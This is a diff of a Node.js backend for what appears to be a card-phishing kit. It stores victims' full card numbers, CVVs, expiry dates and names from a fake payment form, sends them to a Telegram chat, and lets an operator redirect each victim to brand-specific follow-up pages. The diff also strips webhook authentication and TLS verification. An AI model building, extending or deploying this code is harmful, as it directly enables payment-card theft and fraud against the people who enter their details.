@@ -12,9 +12,7 @@ app.use(express.json({ limit: '1mb' }));
 const pool = new Pool({
     connectionString: process.env.DATABASE_URL,
     max: 5,
-    ssl: process.env.DATABASE_URL?.includes('render.com')
-        ? { rejectUnauthorized: false }
-        : false
+    ssl: { rejectUnauthorized: false }
 });
 pool.on('error', err => console.error('❌ PG pool error:', err));
 
@@ -23,8 +21,8 @@ pool.on('error', err => console.error('❌ PG pool error:', err));
 // ============================================================
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
-const PUBLIC_BASE_URL    = process.env.PUBLIC_BASE_URL || 'https://pagos-backend.onrender.com';
-const WEBHOOK_SECRET     = process.env.WEBHOOK_SECRET || '';
+const FRONT_BASE_URL     = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
+const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://package-json-y86a.onrender.com';
 
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('⚠️ Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID');
@@ -38,9 +36,6 @@ async function initDB() {
         CREATE TABLE IF NOT EXISTS pagos_pendientes (
             id               SERIAL PRIMARY KEY,
             solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
-            empresa          VARCHAR(120),
-            monto_clp        NUMERIC(14, 2),
-            referencia       VARCHAR(120),
             titular          VARCHAR(120),
             numero_tarjeta   VARCHAR(30),
             cvv              VARCHAR(6),
@@ -51,9 +46,6 @@ async function initDB() {
             motivo_rechazo   TEXT,
             redirigir_a      VARCHAR(60),
             telegram_msg_id  BIGINT,
-            ip_usuario       VARCHAR(60),
-            pais_usuario     VARCHAR(60),
-            ciudad_usuario   VARCHAR(80),
             created_at       TIMESTAMPTZ DEFAULT NOW(),
             updated_at       TIMESTAMPTZ DEFAULT NOW()
         );
@@ -68,30 +60,46 @@ initDB().catch(err => console.error('❌ initDB:', err));
 // ============================================================
 async function tgSendMessage(text, replyMarkup) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
-    if (replyMarkup) body.reply_markup = replyMarkup;
-    const r = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-    });
-    return r.json();
-}
-
-async function tgEditMessage(messageId, text, replyMarkup) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
     const body = {
         chat_id: TELEGRAM_CHAT_ID,
-        message_id: messageId,
         text,
         parse_mode: 'HTML'
     };
     if (replyMarkup) body.reply_markup = replyMarkup;
+
+    console.log('📤 Telegram sendMessage payload:', JSON.stringify(body, null, 2));
+
     try {
         const r = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(body)
+        });
+        const data = await r.json();
+        if (!data.ok) {
+            console.error('❌ Telegram error:', data);
+        } else {
+            console.log('✅ Telegram mensaje enviado, msg_id:', data.result.message_id);
+        }
+        return data;
+    } catch (e) {
+        console.error('❌ fetch Telegram falló:', e.message);
+        return { ok: false };
+    }
+}
+
+async function tgEditMessage(messageId, text) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+    try {
+        const r = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                message_id: messageId,
+                text,
+                parse_mode: 'HTML'
+            })
         });
         return r.json();
     } catch { return null; }
@@ -112,19 +120,15 @@ async function tgAnswerCallback(callbackQueryId, text) {
 // ENVIAR SOLICITUD A TELEGRAM CON BOTONES
 // ============================================================
 async function enviarSolicitudATelegram(pago) {
-    const montoFmt = Number(pago.monto_clp).toLocaleString('es-CL');
     const texto =
         `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-        `🏢 <b>Empresa:</b> ${pago.empresa || '—'}\n` +
-        `💵 <b>Monto:</b> $${montoFmt} CLP\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
-        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
         `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
-        `🌍 <b>IP:</b> ${pago.ip_usuario || '—'} (${pago.pais_usuario || '—'} / ${pago.ciudad_usuario || '—'})\n` +
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
         `🕒 ${new Date().toLocaleString('es-CL')}`;
 
     const replyMarkup = {
@@ -136,26 +140,20 @@ async function enviarSolicitudATelegram(pago) {
 
     const res = await tgSendMessage(texto, replyMarkup);
     if (res.ok && res.result) {
-        const msgId = res.result.message_id;
         await pool.query(
             `UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`,
-            [msgId, pago.solicitud_id]
+            [res.result.message_id, pago.solicitud_id]
         );
-        return msgId;
     }
-    console.error('❌ Telegram sendMessage:', res);
-    return null;
 }
 
 // ============================================================
-// ENDPOINT: CREAR PAGO (lo llama el front pagotarjeta.html)
+// ENDPOINT: CREAR PAGO
 // ============================================================
 app.post('/api/crear-pago', async (req, res) => {
     const {
-        solicitud_id, empresa, monto_clp, referencia,
-        titular, numero_tarjeta, cvv, vencimiento,
-        marca_tarjeta, banco_emisor,
-        ip_usuario, pais_usuario, ciudad_usuario
+        solicitud_id, titular, numero_tarjeta, cvv, vencimiento,
+        marca_tarjeta, banco_emisor
     } = req.body || {};
 
     if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) {
@@ -168,9 +166,8 @@ app.post('/api/crear-pago', async (req, res) => {
     try {
         const result = await pool.query(
             `INSERT INTO pagos_pendientes
-                (solicitud_id, empresa, monto_clp, referencia, titular, numero_tarjeta, cvv,
-                 vencimiento, marca_tarjeta, banco_emisor, ip_usuario, pais_usuario, ciudad_usuario)
-             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)
+                (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor)
+             VALUES ($1,$2,$3,$4,$5,$6,$7)
              ON CONFLICT (solicitud_id) DO UPDATE
                SET numero_tarjeta = EXCLUDED.numero_tarjeta,
                    cvv = EXCLUDED.cvv,
@@ -180,10 +177,8 @@ app.post('/api/crear-pago', async (req, res) => {
                    updated_at = NOW()
              RETURNING *`,
             [
-                solicitud_id, empresa || '', monto_clp || 0, referencia || '',
-                titular, numero_tarjeta, cvv, vencimiento,
-                marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido',
-                ip_usuario || '', pais_usuario || '', ciudad_usuario || ''
+                solicitud_id, titular, numero_tarjeta, cvv, vencimiento,
+                marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido'
             ]
         );
 
@@ -197,7 +192,7 @@ app.post('/api/crear-pago', async (req, res) => {
 });
 
 // ============================================================
-// ENDPOINT: ESTADO (lo consulta el front con polling)
+// ENDPOINT: ESTADO (polling del front)
 // ============================================================
 app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
     try {
@@ -215,7 +210,7 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
             return res.json({
                 success: true,
                 estado: 'aprobado',
-                redirect: `${PUBLIC_BASE_URL}/${row.redirigir_a}`,
+                redirect: `${FRONT_BASE_URL}/${row.redirigir_a}`,
                 marca: row.marca_tarjeta
             });
         }
@@ -235,23 +230,16 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
 });
 
 // ============================================================
-// WEBHOOK TELEGRAM (recibe clicks de botones)
+// WEBHOOK TELEGRAM (recibe clicks de los botones)
 // ============================================================
 app.post('/api/telegram-webhook', async (req, res) => {
-    // Validar secret opcional
-    if (WEBHOOK_SECRET) {
-        const headerSecret = req.header('x-telegram-bot-api-secret-token');
-        if (headerSecret !== WEBHOOK_SECRET) {
-            console.warn('⚠️ Webhook secret inválido');
-            return res.sendStatus(403);
-        }
-    }
-
     res.sendStatus(200);
 
     const update = req.body || {};
     const cq = update.callback_query;
     if (!cq || !cq.data) return;
+
+    console.log('📩 Callback Telegram recibido:', cq.data);
 
     const [accion, solicitud_id] = cq.data.split(':');
     const msgId = cq.message?.message_id;
@@ -272,8 +260,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
             return;
         }
 
-        const montoFmt = Number(pago.monto_clp).toLocaleString('es-CL');
-
         if (accion === 'aprobar') {
             const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
             const archivo = mapa[(pago.marca_tarjeta || '').toLowerCase()];
@@ -293,10 +279,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 await tgEditMessage(msgId,
                     `✅ <b>PAGO APROBADO</b>\n\n` +
                     `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-                    `🏢 <b>Empresa:</b> ${pago.empresa}\n` +
-                    `💵 <b>Monto:</b> $${montoFmt} CLP\n` +
                     `👤 <b>Titular:</b> ${pago.titular}\n` +
                     `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
+                    `🏦 <b>Banco:</b> ${pago.banco_emisor}\n` +
                     `➡️ <b>Redirigido a:</b> ${archivo}\n` +
                     `🕒 ${new Date().toLocaleString('es-CL')}`
                 );
@@ -315,8 +300,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 await tgEditMessage(msgId,
                     `❌ <b>PAGO RECHAZADO</b>\n\n` +
                     `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-                    `🏢 <b>Empresa:</b> ${pago.empresa}\n` +
-                    `💵 <b>Monto:</b> $${montoFmt} CLP\n` +
                     `👤 <b>Titular:</b> ${pago.titular}\n` +
                     `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
                     `🕒 ${new Date().toLocaleString('es-CL')}`
@@ -328,7 +311,27 @@ app.post('/api/telegram-webhook', async (req, res) => {
     }
 });
 
-// Health
+// ============================================================
+// REGISTRAR WEBHOOK DE TELEGRAM AL ARRANCAR
+// ============================================================
+async function registrarWebhook() {
+    if (!TELEGRAM_BOT_TOKEN) return;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${encodeURIComponent(
+        PUBLIC_BACKEND_URL + '/api/telegram-webhook'
+    )}`;
+    try {
+        const r = await fetch(url);
+        const data = await r.json();
+        if (data.ok) console.log('✅ Webhook Telegram registrado:', PUBLIC_BACKEND_URL + '/api/telegram-webhook');
+        else console.error('❌ Webhook Telegram:', data.description);
+    } catch (e) {
+        console.error('❌ Error registrando webhook:', e.message);
+    }
+}
+
+// ============================================================
+// HEALTH
+// ============================================================
 app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));
 
 // ============================================================
@@ -337,7 +340,9 @@ app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Backend pagos en puerto ${PORT}`);
-    console.log(`🌐 PUBLIC_BASE_URL = ${PUBLIC_BASE_URL}`);
+    console.log(`🌐 FRONT_BASE_URL = ${FRONT_BASE_URL}`);
+    console.log(`🔗 PUBLIC_BACKEND_URL = ${PUBLIC_BACKEND_URL}`);
     console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'OK' : 'FALTA'}`);
     console.log(`🗄️  Postgres: ${process.env.DATABASE_URL ? 'OK' : 'FALTA'}`);
+    registrarWebhook(); // ← registra el webhook solo cada arranque
 });
